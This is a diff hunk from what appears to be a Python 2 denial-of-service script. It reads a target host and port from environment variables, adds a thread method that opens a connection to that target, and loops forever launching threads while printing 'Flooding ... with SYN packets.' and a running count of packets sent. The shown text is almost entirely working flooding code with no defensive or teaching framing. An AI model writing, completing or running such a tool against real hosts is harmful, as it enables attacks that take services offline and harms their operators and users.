@@ -31,20 +31,25 @@ conf = (os.getenv('INTERFACE', 'eth0'), os.getenv('TARGET', '127.0.0.1'),
   os.getenv('PORT', 80))
 
 class sendSYN(threading.Thread):
-	global target, port
-	def __init__(self):
-		threading.Thread.__init__(self)
+  global target, port
+  def __init__(self):
+    threading.Thread.__init__(self)
+
+  def run(self):
+    s = socket.socket()
+    s.connect((target,port))
 
 if __name__ == "__main__":
 
-	interface        = conf[0]
-	target           = conf[1]
-	port             = int(conf[2])
+  interface        = conf[0]
+  target           = conf[1]
+  port             = int(conf[2])
+  print conf
 
-	# Hop to it!
-	print "Flooding %s:%i with SYN packets." % (target, port)
-	while True:
-		if threading.activeCount() < thread_limit:
-			sendSYN().start()
-			total += 1
-			sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
+  # Hop to it!
+  print "Flooding %s:%i with SYN packets." % (target, port)
+  while True:
+    if threading.activeCount() < thread_limit:
+      sendSYN().start()
+      total += 1
+      sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
